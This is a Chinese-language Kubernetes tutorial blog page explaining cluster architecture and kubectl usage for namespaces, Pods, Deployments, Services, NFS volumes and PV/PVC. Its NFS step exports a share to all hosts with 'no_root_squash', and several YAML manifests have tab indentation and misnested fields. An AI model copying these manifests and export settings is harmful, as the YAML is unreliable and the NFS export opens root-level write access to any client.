<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Kubernetes快速实战与核心原理剖析 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Kubernetes快速实战与核心原理剖析" />
<meta property="og:description" content="K8S 概览 K8S 是什么 K8S 官网文档：https://kubernetes.io/zh/docs/home/
K8S 是 Kubernetes 的全称，源于希腊语，意为“舵手”或“飞行员”。Kubernetes 是用于自动部署、扩缩和管理容器化应用程序的开源系统。 Kubernetes 源自 Google 15 年生产环境的运维经验，同时凝聚了社区的最佳创意和实践。
Docker 作为开源的应用容器引擎，可以把应用程序和其相关依赖打包生成一个 Image 镜像文件，是一个标准的运行环境，提供可持续交付的能力；
Kubernetes 作为开源的容器编排引擎，用来对容器化应用进行自动化部署、扩缩和管理；
K8S 核心特性 服务发现与负载均衡 无需修改你的应用程序即可使用陌生的服务发现机制。
存储编排 自动挂载所选存储系统，包括本地存储。
Secret 和配置管理 部署更新 Secrets 和应用程序的配置时不必重新构建容器镜像，且不必将软件堆栈配置中的秘密信息暴露出来。
批量执行 除了服务之外，Kubernetes 还可以管理你的批处理和 CI 工作负载，在期望时替换掉失效的容器。
水平扩缩 使用一个简单的命令、一个 UI 或基于 CPU 使用情况自动对应用程序进行扩缩。
自动化上线和回滚 Kubernetes 会分步骤地将针对应用或其配置的更改上线，同时监视应用程序运行状况以确保你不会同时终止所有实例。
自动装箱 根据资源需求和其他约束自动放置容器，同时避免影响可用性。
自我修复 重新启动失败的容器，在节点死亡时替换并重新调度容器，杀死不响应用户定义的健康检查的容器。
K8S 核心架构 我们已经知道了 K8S 的核心功能：自动化运维管理多个容器化程序。那么 K8S 怎么做到的呢？这里，我们从宏观架构上来学习 K8S 的设计思想。
K8S 是属于 Master-Worker 架构，即有 Master 节点负责核心的调度、管理和运维，Worker 节点则执行用户的程序。但是在 K8S 中，主节点一般被称为 Master Node ，而从节点则被称为 Worker Node 或者 Node。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/0443ea0423979b382f8ca2ed389b604a/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-28T21:48:50+08:00" />
<meta property="article:modified_time" content="2023-12-28T21:48:50+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Kubernetes快速实战与核心原理剖析</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="K8S__0"></a>K8S 概览</h2> 
<h3><a id="K8S__1"></a>K8S 是什么</h3> 
<blockquote> 
 <p>K8S 官网文档：<a href="https://kubernetes.io/zh/docs/home/" rel="nofollow">https://kubernetes.io/zh/docs/home/</a></p> 
</blockquote> 
<p>K8S 是 Kubernetes 的全称，源于希腊语，意为“舵手”或“飞行员”。Kubernetes 是用于自动部署、扩缩和管理容器化应用程序的开源系统。 Kubernetes 源自 Google 15 年生产环境的运维经验，同时凝聚了社区的最佳创意和实践。</p> 
<ul><li>Docker</li></ul> 
<p>作为开源的应用容器引擎，可以把应用程序和其相关依赖打包生成一个 Image 镜像文件，是一个标准的运行环境，提供可持续交付的能力；</p> 
<ul><li>Kubernetes</li></ul> 
<p>作为开源的容器编排引擎，用来对容器化应用进行自动化部署、扩缩和管理；</p> 
<h3><a id="K8S__13"></a>K8S 核心特性</h3> 
<ul><li>服务发现与负载均衡</li></ul> 
<p>无需修改你的应用程序即可使用陌生的服务发现机制。</p> 
<ul><li>存储编排</li></ul> 
<p>自动挂载所选存储系统，包括本地存储。</p> 
<ul><li>Secret 和配置管理</li></ul> 
<p>部署更新 Secrets 和应用程序的配置时不必重新构建容器镜像，且不必将软件堆栈配置中的秘密信息暴露出来。</p> 
<ul><li>批量执行</li></ul> 
<p>除了服务之外，Kubernetes 还可以管理你的批处理和 CI 工作负载，在期望时替换掉失效的容器。</p> 
<ul><li>水平扩缩</li></ul> 
<p>使用一个简单的命令、一个 UI 或基于 CPU 使用情况自动对应用程序进行扩缩。</p> 
<ul><li>自动化上线和回滚</li></ul> 
<p>Kubernetes 会分步骤地将针对应用或其配置的更改上线，同时监视应用程序运行状况以确保你不会同时终止所有实例。</p> 
<ul><li>自动装箱</li></ul> 
<p>根据资源需求和其他约束自动放置容器，同时避免影响可用性。</p> 
<ul><li>自我修复</li></ul> 
<p>重新启动失败的容器，在节点死亡时替换并重新调度容器，杀死不响应用户定义的健康检查的容器。</p> 
<h4><a id="K8S__46"></a>K8S 核心架构</h4> 
<p>我们已经知道了 K8S 的核心功能：自动化运维管理多个容器化程序。那么 K8S 怎么做到的呢？这里，我们从宏观架构上来学习 K8S 的设计思想。<br>K8S 是属于 Master-Worker 架构，即有 Master 节点负责核心的调度、管理和运维，Worker 节点则执行用户的程序。但是在 K8S 中，主节点一般被称为 Master Node ，而从节点则被称为 Worker Node 或者 Node。<br>注意：Master Node 和 Worker Node 是分别安装了 K8S 的 Master 和 Woker 组件的实体服务器，每个 Node 都对应了一台实体服务器（虽然 Master Node 可以和其中一个 Worker Node 安装在同一台服务器，但是建议 Master Node 单独部署），所有 Master Node 和 Worker Node 组成了 K8S 集群，同一个集群可能存在多个 Master Node 和 Worker Node。<br><img src="https://images2.imgbox.com/cf/b9/HSHt23UA_o.png" alt="image.png"><br>首先来看 Master Node 都有哪些组件：</p> 
<ul><li>kube-apiserver</li></ul> 
<p>K8S 的请求入口服务。API Server 负责接收 K8S 所有请求（来自 UI 界面或者 CLI 命令行工具），然后，API Server 根据用户的具体请求，去通知其他组件干活。</p> 
<ul><li>Scheduler</li></ul> 
<p>K8S 所有 Worker Node 的调度器。当用户要部署服务时，Scheduler 会选择最合适的 Worker Node（服务器）来部署。</p> 
<ul><li>Controller Manager</li></ul> 
<p>K8S 所有 Worker Node 的监控器。Controller Manager 有很多具体的 Controller，Node Controller、Service Controller、Volume Controller 等。Controller 负责监控和调整在 Worker Node 上部署的服务的状态，比如用户要求 A 服务部署 2 个副本，那么当其中一个服务挂了的时候，Controller 会马上调整，让 Scheduler 再选择一个 Worker Node 重新部署服务。</p> 
<ul><li>etcd</li></ul> 
<p>K8S 的存储服务。etcd 存储了 K8S 的关键配置和用户配置，K8S 中仅 API Server 才具备读写权限，其他组件必须通过 API Server 的接口才能读写数据。</p> 
<p>接着来看 Worker Node 的组件：</p> 
<ul><li>Kubelet</li></ul> 
<p>Worker Node 的监视器，以及与 Master Node 的通讯器。Kubelet 是 Master Node 安插在 Worker Node 上的“眼线”，它会定期向 Master Node 汇报自己 Node 上运行的服务的状态，并接受来自 Master Node 的指示采取调整措施。负责控制所有容器的启动停止，保证节点工作正常。</p> 
<ul><li>Kube-Proxy</li></ul> 
<p>K8S 的网络代理。Kube-Proxy 负责 Node 在 K8S 的网络通讯、以及对外部网络流量的负载均衡。</p> 
<ul><li>Container Runtime</li></ul> 
<p>Worker Node 的运行环境。即安装了容器化所需的软件环境确保容器化程序能够跑起来，比如 Docker Engine 运行环境。</p> 
<h3><a id="K8S__78"></a>K8S 集群安装</h3> 
<blockquote> 
 <p>官方文档：<a href="https://kubernetes.io/zh-cn/docs/setup/production-environment/tools/kubeadm/install-kubeadm/" rel="nofollow">https://kubernetes.io/zh-cn/docs/setup/production-environment/tools/kubeadm/install-kubeadm/</a></p> 
</blockquote> 
<h2><a id="K8S__81"></a>K8S 快速实战</h2> 
<h3><a id="kubectl__82"></a>kubectl 命令使用</h3> 
<p>kubectl 是 apiserver 的客户端工具，工作在命令行下，能够连接 apiserver 实现各种增删改查等操作 kubectl。</p> 
<blockquote> 
 <p>官方使用文档：<a href="https://kubernetes.io/zh/docs/reference/kubectl/overview/" rel="nofollow">https://kubernetes.io/zh/docs/reference/kubectl/overview/</a></p> 
</blockquote> 
<p>K8S 的各种命令帮助文档做得非常不错，遇到问题可以多查 help 帮助。</p> 
<h3><a id="Namespace_87"></a>Namespace</h3> 
<p>K8S 中，命名空间（Namespace）提供一种机制，将同一集群中的资源划分为相互隔离的组。同一命名空间内的资源名称要唯一，<strong>命名空间是用来隔离资源的，不隔离网络</strong>。<br>Kubernetes 启动时会创建四个初始命名空间：</p> 
<ul><li>default</li></ul> 
<p>Kubernetes 包含这个命名空间，以便于你无需创建新的命名空间即可开始使用新集群。</p> 
<ul><li>kube-node-lease</li></ul> 
<p>该命名空间包含用于与各个节点关联的 Lease（租约）对象。 节点租约允许 kubelet 发送心跳， 由此控制面能够检测到节点故障。</p> 
<ul><li>kube-public</li></ul> 
<p>所有的客户端（包括未经身份验证的客户端）都可以读取该命名空间。 该命名空间主要预留为集群使用，以便某些资源需要在整个集群中可见可读。 该命名空间的公共属性只是一种约定而非要求。</p> 
<ul><li>kube-system</li></ul> 
<p>该命名空间用于 Kubernetes 系统创建的对象。</p> 
<pre><code class="prism language-bash"><span class="token comment"># 查看namespace</span>
kubectl get namespace
<span class="token comment"># 查看kube-system下的pod</span>
kubectl get pods <span class="token parameter variable">-n</span> kube-system
<span class="token comment"># 查看所有namespace下的pod</span>
kubectl get pods <span class="token parameter variable">-A</span>
</code></pre> 
<p>创建 Namesapce：</p> 
<ul><li>命令行方式</li></ul> 
<p>可以使用下面的命令创建 Namespace：</p> 
<pre><code class="prism language-bash">kubectl create namespace firechou
</code></pre> 
<ul><li>yaml 方式</li></ul> 
<p>新建一个名为 my-namespace.yaml 的 YAML 文件，并写入下列内容：</p> 
<pre><code class="prism language-bash">apiVersion: v1
kind: Namespace
metadata:
name: mall
</code></pre> 
<p>然后运行：</p> 
<pre><code class="prism language-bash">kubectl apply <span class="token parameter variable">-f</span> my-namespace.yaml
</code></pre> 
<p>删除 namesapce：</p> 
<pre><code class="prism language-bash">kubectl delete namespace firechou
kubectl delete <span class="token parameter variable">-f</span> my-namespace.yaml
</code></pre> 
<h3><a id="Pod_142"></a>Pod</h3> 
<p>Pod 是可以在 Kubernetes 中创建和管理的、最小的可部署的计算单元。Pod（就像在鲸鱼荚或者豌豆荚中）是一组（一个或多个）容器；这些容器共享存储、网络、以及怎样运行这些容器的声明。</p> 
<p>创建 Pod 示例：运行一个 NGINX 容器：</p> 
<ul><li>命令行方式</li></ul> 
<pre><code class="prism language-bash"><span class="token comment"># 创建pod</span>
kubectl run mynginx <span class="token parameter variable">--image</span><span class="token operator">=</span>nginx:1.14.2
<span class="token comment"># 获取pod的信息，-owide 表示更详细的显示信息 -n 命名空间 查询对应namespace下的pod</span>
kubectl get pod
kubectl get pod <span class="token parameter variable">-owide</span>
kubectl get pod <span class="token parameter variable">-owide</span> <span class="token parameter variable">-n</span> <span class="token operator">&lt;</span>namespace-name<span class="token operator">&gt;</span>
<span class="token comment"># 查看pod的详情</span>
kubectl describe pod <span class="token operator">&lt;</span>pod-name<span class="token operator">&gt;</span>
<span class="token comment"># 查看Pod的运行日志</span>
kubectl logs <span class="token operator">&lt;</span>pod-name<span class="token operator">&gt;</span>
<span class="token comment"># 删除pod</span>
kubectl delete pod <span class="token operator">&lt;</span>pod-name<span class="token operator">&gt;</span>
</code></pre> 
<ul><li>yaml 方式</li></ul> 
<pre><code class="prism language-bash"><span class="token comment"># vim nginx-pod.yaml</span>

apiVersion: v1
kind: Pod
metadata:
	labels:
		run: mynginx
	name: mynginx
spec:
	containers:
		- name: nginx
		image: nginx:1.14.2
		ports:
		- containerPort: <span class="token number">80</span> 
</code></pre> 
<p>然后运行：</p> 
<pre><code class="prism language-bash">kubectl apply <span class="token parameter variable">-f</span> nginx-pod.yaml
</code></pre> 
<p>删除 pod：</p> 
<pre><code class="prism language-bash">kubectl delete <span class="token parameter variable">-f</span> nginx-pod.yaml
</code></pre> 
<h3><a id="Deployment_188"></a>Deployment</h3> 
<p>Deployment 负责创建和更新应用程序的实例，使 Pod 拥有多副本，自愈，扩缩容等能力。创建 Deployment 后，Kubernetes Master 将应用程序实例调度到集群中的各个节点上。如果托管实例的节点关闭或被删除，Deployment 控制器会将该实例替换为群集中另一个节点上的实例。这提供了一种自我修复机制来解决机器故障维护问题。</p> 
<p>创建一个 Tomcat 应用程序：<br>使用 <code>kubectl create deployment</code> 命令可以创建一个应用部署 deployment 与 pod 。</p> 
<pre><code class="prism language-bash"><span class="token comment"># my-tomcat表示pod的名称 --image表示镜像的地址</span>
kubectl create deployment my-tomcat <span class="token parameter variable">--image</span><span class="token operator">=</span>tomcat:9.0.55

<span class="token comment"># 查看一下deployment的信息</span>
kubectl get deployment

<span class="token comment"># 删除deployment</span>
kubectl delete deployment my-tomcat

<span class="token comment"># 查看Pod打印的日志</span>
kubectl logs my-tomcat-6d6b57c8c8-n5gm4

<span class="token comment"># 使用 exec 可以在Pod的容器中执行命令</span>
kubectl <span class="token builtin class-name">exec</span> my-tomcat-6d6b57c8c8-n5gm4 -- <span class="token function">env</span> <span class="token comment"># 使用 env 命令查看环境变量</span>
kubectl <span class="token builtin class-name">exec</span> my-tomcat-6d6b57c8c8-n5gm4 -- <span class="token function">ls</span> / <span class="token comment"># 查看容器的根目录下面内容</span>
kubectl <span class="token builtin class-name">exec</span> my-tomcat-6d6b57c8c8-n5gm4 -- <span class="token function">sh</span> <span class="token comment"># 进入Pod容器内部并执行bash命令，如果想退出容器可以使用exit命令</span>
</code></pre> 
<p>自愈：<br>现在我们来删除刚刚添加的 pod，看看会发生什么：</p> 
<pre><code class="prism language-bash"><span class="token comment"># 查看pod信息，-w意思是一直等待观察pod信息的变动</span>
kubectl get pod <span class="token parameter variable">-w</span>
</code></pre> 
<p>开另外一个命令窗口执行如下命令，同时观察之前命令窗口的变化情况：</p> 
<pre><code class="prism language-bash">kubectl delete pod my-tomcat-6d6b57c8c8-n5gm4
</code></pre> 
<p>我们可以看到之前那个 tomcat 的 pod 被销毁，但是又重新启动了一个新的 tomcat pod，这是 k8s 的服务自愈功能，不需要运维人员干预。</p> 
<p>多副本：</p> 
<ul><li>命令行的方式</li></ul> 
<pre><code class="prism language-bash"><span class="token comment"># 创建3个副本</span>
kubectl create deployment my-tomcat <span class="token parameter variable">--image</span><span class="token operator">=</span>tomcat:9.0.55 <span class="token parameter variable">--replicas</span><span class="token operator">=</span><span class="token number">3</span>
</code></pre> 
<ul><li>yaml方式</li></ul> 
<pre><code class="prism language-bash">apiVersion: apps/v1
kind: Deployment
metadata:
	labels:
		app: my-tomcat
  name: my-tomcat
spec:
	replicas: <span class="token number">3</span>
	selector:
		matchLabels:
			app: my-tomcat
	template:
		metadata:
			labels:
				app: my-tomcat
		spec:
			containers:
			- image: tomcat:9.0.55
				name: tomcat 
</code></pre> 
<p>扩缩容：</p> 
<pre><code class="prism language-bash"><span class="token comment"># 扩容到5个pod</span>
kubectl scale <span class="token parameter variable">--replicas</span><span class="token operator">=</span><span class="token number">5</span> deployment my-tomcat
<span class="token comment"># 缩到3个pod</span>
kubectl scale <span class="token parameter variable">--replicas</span><span class="token operator">=</span><span class="token number">3</span> deployment my-tomcat
<span class="token comment"># 修改 replicas</span>
kubectl edit deployment my-tomcat
</code></pre> 
<p>滚动升级与回滚：<br>对 my-tomcat 这个 deployment 进行滚动升级和回滚，将 tomcat 版本由 tomcat:9.0.55 升级到 tomcat:10.1.11，再回滚到 tomcat:9.0.55。</p> 
<p>滚动升级：</p> 
<pre><code class="prism language-bash">kubectl <span class="token builtin class-name">set</span> image deployment my-tomcat <span class="token assign-left variable">tomcat</span><span class="token operator">=</span>tomcat:10.1.11 <span class="token parameter variable">--record</span>
</code></pre> 
<p>可以执行 <code>kubectl get pod -w</code> 观察 pod 的变动情况，可以看到有的 pod 在销毁，有的 pod 在创建查看 pod 信息。</p> 
<pre><code class="prism language-bash">kubectl get pod
</code></pre> 
<p>查看某个 pod 的详细信息，发现 pod 里的镜像版本已经升级了.</p> 
<pre><code class="prism language-bash">kubectl describe pod my-tomcat-85c5c8f685-lnkfm
</code></pre> 
<p>版本回滚：<br>查看历史版本</p> 
<pre><code class="prism language-bash">kubectl rollout <span class="token function">history</span> deploy my-tomcat
</code></pre> 
<p>回滚到上一个版本</p> 
<pre><code class="prism language-bash">kubectl rollout undo deployment my-tomcat <span class="token comment"># --to-revision 参数可以指定回退的版本</span>

<span class="token comment"># 回滚(回到指定版本)</span>
kubectl rollout undo deployment/my-dep --to-revision<span class="token operator">=</span><span class="token number">2</span>
</code></pre> 
<p>查看pod详情，发现版本已经回退了。</p> 
<p>访问 tomcat pod：</p> 
<ul><li>集群内访问（在集群里任一 worker 节点都可以访问）</li></ul> 
<pre><code class="prism language-bash"><span class="token function">curl</span> <span class="token number">10.244</span>.169.164:8080
</code></pre> 
<ul><li>集群外部访问</li></ul> 
<p>当我们在集群之外访问发现无法访问，那么集群之外的客户端如何才能访问呢？这就需要我们的 service 服务了，下面我们就创建一个 service，使外部客户端可以访问我们的 pod。</p> 
<h3><a id="Service_301"></a>Service</h3> 
<p>Service 是一个抽象层，它定义了一组 Pod 的逻辑集，并为这些 Pod 支持外部流量暴露、负载均衡和服务发现。<br>尽管每个 Pod 都有一个唯一的 IP 地址，但是如果没有 Service，这些 IP 不会暴露在群集外部。Service 允许你的应用程序接收流量。Service 也可以用在 ServiceSpec 标记 type 的方式暴露，type 类型如下：</p> 
<ul><li>ClusterIP（默认）：在集群的内部 IP 上公开 Service。这种类型使得 Service 只能从集群内访问。</li><li>NodePort：使用 NAT 在集群中每个选定 Node 的相同端口上公开 Service。使用 <code>&lt;NodeIP&gt;:&lt;NodePort&gt;</code> 从集群外部访问 Service。是 ClusterIP 的超集。</li><li>LoadBalancer：在当前云中创建一个外部负载均衡器（如果支持的话），并为 Service 分配一个固定的外部 IP。是 NodePort 的超集。</li><li>ExternalName：通过返回带有该名称的 CNAME 记录，使用任意名称（由 spec 中的 externalName 指定）公开Service。不使用代理。</li></ul> 
<p>创建 service 示例：</p> 
<ul><li>命令行的方式</li></ul> 
<pre><code class="prism language-bash">kubectl expose deployment my-tomcat <span class="token parameter variable">--name</span><span class="token operator">=</span>tomcat <span class="token parameter variable">--port</span><span class="token operator">=</span><span class="token number">8080</span> <span class="token parameter variable">--type</span><span class="token operator">=</span>NodePort

<span class="token comment"># 查看service信息，port信息里冒号后面的端口号就是对集群外暴露的访问接口</span>
<span class="token comment"># NodePort范围在 30000-32767 之间</span>
kubectl get svc <span class="token parameter variable">-o</span> wide
</code></pre> 
<p>集群外部访问：<br>使用集群节点的 ip 加上暴露的端口就可以访问。<br>tomcat 版本太高返回 404 的解决办法：进入 tomcat 容器，把 webapps 目录删除，再把 <code>webapps.dist</code> 重命名为 webapps 即可。</p> 
<ul><li>yaml 的方式</li></ul> 
<pre><code class="prism language-bash"><span class="token comment"># vim mytomcat-service.yaml</span>

apiVersion: v1
kind: Service
metadata:
	labels:
		app: my-tomcat
	name: my-tomcat
spec:
	ports:
	- port: <span class="token number">8080</span> <span class="token comment"># service的虚拟ip对应的端口，在集群内网机器可以访问用service的虚拟ip加该端口号访问服务</span>
  	nodePort: <span class="token number">30001</span> <span class="token comment"># service在宿主机上映射的外网访问端口，端口范围必须在30000-32767之间</span>
   	protocol: TCP
  	targetPort: <span class="token number">8080</span> <span class="token comment"># pod暴露的端口，一般与pod内部容器暴露的端口一致</span>
	selector:
		app: my-tomcat
	type: NodePort
</code></pre> 
<p>执行如下命令创建 service：</p> 
<pre><code class="prism language-bash">kubectl apply <span class="token parameter variable">-f</span> mytomcat-service.yaml
</code></pre> 
<h3><a id="_346"></a>存储</h3> 
<h4><a id="Volume_347"></a>Volume</h4> 
<p>Volume 指的是存储卷，包含可被 Pod 中容器访问的数据目录。容器中的文件在磁盘上是临时存放的，当容器崩溃时文件会丢失，同时无法在多个 Pod 中共享文件，通过使用存储卷可以解决这两个问题。<br>Kubernetes 支持很多类型的卷。Pod 可以同时使用任意数目的卷类型。临时卷类型的生命周期与 Pod 相同，但持久卷可以比 Pod 的存活期长。 当 Pod 不再存在时，Kubernetes 也会销毁临时卷；<br>不过 Kubernetes 不会销毁持久卷。对于给定 Pod 中任何类型的卷，在容器重启期间数据都不会丢失。<br>卷的核心是一个目录，其中可能存有数据，Pod 中的容器可以访问该目录中的数据。所采用的不同卷的类型将决定该目录如何形成的、使用何种介质保存数据以及目录中存放的内容。常用的卷类型有 configMap、emptyDir、local、nfs、secret 等。</p> 
<ul><li>ConfigMap</li></ul> 
<p>可以将配置文件以键值对的形式保存到 ConfigMap 中，并且可以在 Pod 中以文件或环境变量的形式使用。ConfigMap 可以用来存储不敏感的配置信息，如应用程序的配置文件。</p> 
<ul><li>EmptyDir</li></ul> 
<p>是一个空目录，可以在 Pod 中用来存储临时数据，当 Pod 被删除时，该目录也会被删除。</p> 
<ul><li>Local</li></ul> 
<p>将本地文件系统的目录或文件映射到 Pod 中的一个 Volume 中，可以用来在 Pod 中共享文件或数据。</p> 
<ul><li>NFS</li></ul> 
<p>将网络上的一个或多个 NFS 共享目录挂载到 Pod 中的 Volume 中，可以用来在多个 Pod 之间共享数据。</p> 
<ul><li>Secret</li></ul> 
<p>将敏感信息以密文的形式保存到 Secret 中，并且可以在 Pod 中以文件或环境变量的形式使用。Secret 可以用来存储敏感信息，如用户名密码、证书等。</p> 
<p>（1）使用方式<br>使用卷时, 在 <code>.spec.volumes</code> 字段中设置为 Pod 提供的卷，并在 <code>.spec.containers[*].volumeMounts</code> 字段中声明卷在容器中的挂载位置。容器中的进程看到的文件系统视图是由它们的容器镜像的初始内容以及挂载在容器中的卷（如果定义了的话）所组成的。 其中根文件系统同容器镜像的内容相吻合。<br>任何在该文件系统下的写入操作，如果被允许的话，都会影响接下来容器中进程访问文件系统时所看到的内容。</p> 
<pre><code class="prism language-bash">apiVersion: v1
kind: Pod
metadata:
	name: configmap-pod
spec:
	containers:
		- name: <span class="token builtin class-name">test</span>
    	image: busybox:1.28
			volumeMounts:
      <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
	volumes:
  	<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
</code></pre> 
<p>（2）搭建nfs文件系统<br>nfs(network filesystem)：网络文件存储系统。</p> 
<p>安装 nfs-server：</p> 
<pre><code class="prism language-bash"><span class="token comment"># 在每个机器。</span>
yum <span class="token function">install</span> <span class="token parameter variable">-y</span> nfs-utils

<span class="token comment"># 在master 执行以下命令</span>
<span class="token builtin class-name">echo</span> <span class="token string">"/nfs/data/ *(insecure,rw,sync,no_root_squash)"</span> <span class="token operator">&gt;</span> /etc/exports

<span class="token comment"># 执行以下命令，启动 nfs 服务;创建共享目录</span>
<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /nfs/data

<span class="token comment"># 在master执行</span>
systemctl <span class="token builtin class-name">enable</span> rpcbind
systemctl <span class="token builtin class-name">enable</span> nfs-server
systemctl start rpcbind
systemctl start nfs-server

<span class="token comment"># 使配置生效</span>
exportfs <span class="token parameter variable">-r</span>

<span class="token comment"># 检查配置是否生效</span>
exportfs
</code></pre> 
<p>配置 nfs-client：</p> 
<pre><code class="prism language-bash"><span class="token comment"># nfs-server节点的ip</span>
showmount <span class="token parameter variable">-e</span> <span class="token number">192.168</span>.11.101
<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /nfs/data
<span class="token function">mount</span> <span class="token parameter variable">-t</span> nfs <span class="token number">192.168</span>.11.101:/nfs/data /nfs/data
</code></pre> 
<p>nfs 方式数据挂载：<br>相对于 emptyDir 和 hostPath，nfs 这种 Volume 类型的最大特点就是不依赖 Kuberees Volume 的底层基础设施由独立的存储系统管理，与 Kubernetes 集群是分离的。数据被持久化后，即使整个 Kubernetes 崩溃也不会受损。</p> 
<pre><code class="prism language-bash">apiVersion: apps/v1
kind: Deployment
metadata:
	labels:
		app: nginx-pv-demo
	name: nginx-pv-demo
spec:
	replicas: <span class="token number">2</span>
	selector:
		matchLabels:
			app: nginx-pv-demo
	template:
		metadata:
			labels:
				app: nginx-pv-demo
		spec:
			containers:
			- image: nginx
				name: nginx
				volumeMounts:
				- name: html
					mountPath: /usr/share/nginx/html
			volumes:
				- name: html
					nfs:
						server: <span class="token number">192.168</span>.11.101
						path: /nfs/data/nginx-pv
</code></pre> 
<h4><a id="PV__PVC_450"></a>PV &amp; PVC</h4> 
<p>Volume 提供了非常好的数据持久化方案，不过在可管理性上还有不足。前面 nfs 例子来说，要使用 Volume， Pod 必须事先知道以下信息：</p> 
<ul><li>当前的 Volume 类型并明确 Volume 已经创建好。</li><li>必须知道 Volume 的具体地址信息。</li></ul> 
<p>但是 Pod 通常是由应用的开发人员维护，而 Volume 则通常是由存储系统的管理员维护。开发人员要获得上面的信息，要么询问管理员，要么自己就是管理员。这样就带来一个管理上的问题：应用开发人员和系统管理员的职责耦合在一起了。如果系统规模较小或者对于开发环境，这样的情况还可以接受，当集群规模变大，特别是对于生产环境，考虑到效率和安全性，这就成了必须要解决的问题。<br>Kubernetes 给出的解决方案是 Persistent Volume 和 Persistent Volume Claim。<br>PersistentVolume（PV）是外部存储系统中的一块存储空间，由管理员创建和维护，将应用需要持久化的数据保存到指定位置。与 Volume 一样，PV 具有持久性，生命周期独立于 Pod。<br>Persistent Volume Claim（PVC）是对 PV 的申请（Claim），申明需要使用的持久卷规格。PVC 通常由普通用户创建和维护。需要为 Pod 分配存储资源时，用户可以创建一个 PVC，指明存储资源的容量大小和访问模式 （比如只读）等信息，Kubernetes 会查找并提供满足条件的 PV。有了 PersistentVolumeClaim，用户只需要告诉 Kubernetes 需要什么样的存储资源，而不必关心真正的空间从哪里分配、如何访问等底层细节信息。这些 Storage Provider 的底层信息交给管理员来处理，只有管理员才应该关心创建 PersistentVolume 的细节信息。</p> 
<p>（1）基本使用<br>创建 pv：</p> 
<pre><code class="prism language-bash">apiVersion: v1
kind: PersistentVolume
metadata:
	name: nfs-pv
spec:
	capacity:
		storage: 1Gi <span class="token comment"># 指定容量大小</span>
	accessModes: <span class="token comment"># 访问模式</span>
		- ReadWriteMany
persistentVolumeReclaimPolicy: Retain
storageClassName: nfs
nfs:
	path: /<span class="token punctuation">{<!-- --></span>nfs-server目录名称<span class="token punctuation">}</span>
	server: <span class="token punctuation">{<!-- --></span>nfs-server IP 地址<span class="token punctuation">}</span>
</code></pre> 
<p>accessModes：支持的访问模式有3种：</p> 
<ul><li>ReadWriteOnce 表示 PV 能以 readwrite 模式 mount 到单个节点</li></ul> 
<p>这个 PV 只能被某个节点以读写方式挂载，意味着这个 PV 只能被一个 Pod 挂载到某个节点上，并且这个 Pod 可以对这个 PV 进行读写操作。如果尝试在其他节点上挂载这个 PV，就会失败。</p> 
<ul><li>ReadOnlyMany 表示 PV 能以 read-only 模式 mount 到多个节点</li></ul> 
<p>这个 PV 能被多个节点以只读方式挂载，意味着这个 PV 可以被多个 Pod 挂载到多个节点上。</p> 
<ul><li>ReadWriteMany 表示 PV 能以 read-write 模式 mount 到多个节点</li></ul> 
<p>这个 PV 能被多个节点以读写方式挂载，意味着这个 PV 可以被多个 Pod 挂载到多个节点上。</p> 
<p>persistentVolumeReclaimPolicy：指定当 PV 的回收策略支持的策略有 3 种：</p> 
<ul><li>Retain：在 PVC 被删除后，保留 PV 和其数据，手动清理 PV 中的数据。</li><li>Delete：在 PVC 被删除后，自动删除 PV 和其数据。</li><li>Recycle：在 PVC 被删除后，通过删除 PV 中的数据来准备 PV 以供重新使用。</li></ul> 
<p>值得注意的是，persistentVolumeReclaimPolicy只适用于一些类型的 PV，如 NFS、HostPath、iSCSI 等。对于一些云平台提供的存储，如 AWS EBS 和 Azure Disk，由于底层提供商会自动处理 PV 的回收问题，因此该属性不适用。</p> 
<p>storageClassName：指定 PV 的 class 为 nfs。相当于为 PV 设置了一个分类，PVC 可以指定 class 申请相应<br>class 的 PV。</p> 
<p>创建 pvc：</p> 
<pre><code class="prism language-bash">apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: nfs-pvc
spec:
	accessModes:
		- ReadWriteMany
	resources:
  	requests:
  		storage: 1Gi
  storageClassName: nfs <span class="token comment"># 通过名字进行选择</span>
<span class="token comment"># selector: 通过标签形式</span>
<span class="token comment"># matchLabels:</span>
<span class="token comment"># pv-name: nfs-pv</span>
</code></pre> 
